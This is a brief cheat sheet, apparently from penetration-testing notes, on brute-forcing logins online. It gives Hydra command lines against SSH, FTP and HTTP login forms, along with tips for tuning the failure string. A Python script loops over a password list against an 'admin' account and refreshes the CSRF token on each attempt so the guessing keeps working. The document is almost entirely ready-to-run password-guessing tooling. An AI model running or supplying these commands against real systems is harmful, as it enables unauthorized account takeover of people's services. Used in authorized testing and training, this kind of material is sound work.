# Online login checks

Check lockout and account scope first; capture one known failure (including redirect).

```bash
hydra -l <USER> -P candidates.txt <IP> ssh -t 4
hydra -l <USER> -P candidates.txt <IP> ftp -t 4
hydra -l <USER> -P candidates.txt <IP> http-post-form '/login:user=^USER^&pass=^PASS^:Invalid'
```
```bash
hydra -U http-post-form
```
- `hydra -U <MODULE>` shows the module's option syntax. Set the real path, field names and failure text.
- Baseline one success and one failure first; refresh per-request CSRF token/session (below).
- Every attempt "succeeds" → recheck the failure string, token and redirect.

## Per-request CSRF token
Hydra can't refresh a token per attempt: script it (expects a `csrf` field and a `/dashboard` redirect on success).

```python
import re
import requests

url = "http://<IP>/login"
for password in open("candidates.txt", encoding="utf-8"):
    with requests.Session() as session:
        page = session.get(url)
        match = re.search(r'name="csrf" value="([^"]+)"', page.text)
        if not match:
            raise RuntimeError("CSRF token missing")
        response = session.post(
            url,
            data={"csrf": match.group(1), "username": "admin", "password": password.strip()},
            allow_redirects=False,
        )
        if response.status_code == 302 and response.headers.get("Location") == "/dashboard":
            print("Found:", password.strip())
            break
```
